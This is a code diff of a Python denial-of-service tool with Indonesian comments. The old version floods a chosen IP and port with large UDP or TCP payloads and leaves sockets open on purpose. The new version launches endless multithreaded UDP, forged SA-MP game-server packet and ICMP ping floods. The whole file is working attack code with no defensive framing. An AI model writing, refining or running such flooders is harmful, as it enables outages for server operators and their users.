@@ -1,53 +1,66 @@
 import socket
 import threading
 import random
-import time
+import os
+import platform
+import datetime
 
-target = input("IP Target: ")
-port = int(input("Port: "))
-method = input("Metode (UDP/TCP): ").upper()
-duration = int(input("Durasi (detik): "))
-threads = int(input("Jumlah Threads: "))
+target_ip = input("IP Target: ")
+target_port = int(input("Port Target: "))
+total_threads = 100
 
-timeout = time.time() + duration
+# ===== Waktu Debug Format ==========================================================
+def get_time():
+    return datetime.datetime.now().strftime("%H:%M:%S")
 
-# Payload besar untuk makan RAM & CPU target
-big_data = random._urandom(65500)
-
-def udp_cpu_ram():
-    while time.time() < timeout:
+# ===== 1. UDP FLOOD =================================================================
+def udp_flood():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    thread_id = threading.get_ident()
+    bytes_data = random._urandom(1024)
+    while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.sendto(big_data, (target, port))
+            sock.sendto(bytes_data, (target_ip, target_port))
+            print(f"Attack sent: {target_ip}:{target_port} | Thread-{thread_id} | {get_time()} | ✅ Success [UDP]")
         except:
-            pass
+            print(f"Attack sent: {target_ip}:{target_port} | Thread-{thread_id} | {get_time()} | ❌ Failed [UDP]")
 
-def tcp_cpu_ram():
-    while time.time() < timeout:
+# ===== 2. FAKE SAMP PACKET FLOOD ===================================================
+def samp_flood():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    thread_id = threading.get_ident()
+    while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(1)
-            s.connect((target, port))
-            for _ in range(10):  # Spam banyak data sebelum close
-                s.send(big_data)
-            # Jangan close biar soket target numpuk (socket leak)
+            packet = b'SAMP' + bytes([127, 0, 0, 1]) + target_port.to_bytes(2, 'little') + b'p0101'
+            sock.sendto(packet, (target_ip, target_port))
+            print(f"Attack sent: {target_ip}:{target_port} | Thread-{thread_id} | {get_time()} | ✅ Success [SAMP]")
         except:
-            pass
+            print(f"Attack sent: {target_ip}:{target_port} | Thread-{thread_id} | {get_time()} | ❌ Failed [SAMP]")
 
-if method == "UDP":
-    attack_func = udp_cpu_ram
-elif method == "TCP":
-    attack_func = tcp_cpu_ram
-else:
-    print("❌ Metode harus UDP atau TCP!")
-    exit()
+# ===== 3. ICMP PING FLOOD ==========================================================
+def icmp_flood():
+    thread_id = threading.get_ident()
+    cmd = ""
+    if platform.system().lower() == "windows":
+        cmd = f"ping -n 1 {target_ip} >nul"
+    else:
+        cmd = f"ping -c 1 {target_ip} >/dev/null"
 
-print(f"\n💀 BRUTAL MODE ON: {method} -> {target}:{port} selama {duration} detik ({threads} threads)\n")
+    while True:
+        result = os.system(cmd)
+        if result == 0:
+            print(f"Attack sent: {target_ip} | Thread-{thread_id} | {get_time()} | ✅ Success [ICMP]")
+        else:
+            print(f"Attack sent: {target_ip} | Thread-{thread_id} | {get_time()} | ❌ Failed [ICMP]")
 
-for i in range(threads):
-    threading.Thread(target=attack_func).start()
+# ===== LAUNCH ALL THREADS ==========================================================
+print(f"[INFO] Menyerang {target_ip}:{target_port} dengan {total_threads} thread per jenis serangan...\n")
 
-while time.time() < timeout:
-    time.sleep(1)
+for _ in range(total_threads):
+    threading.Thread(target=udp_flood, daemon=True).start()
+    threading.Thread(target=samp_flood, daemon=True).start()
+    threading.Thread(target=icmp_flood, daemon=True).start()
 
-print("\n✅ Selesai. Cek target apakah surviv.")
+# Keep main thread alive
+while True:
+    pass
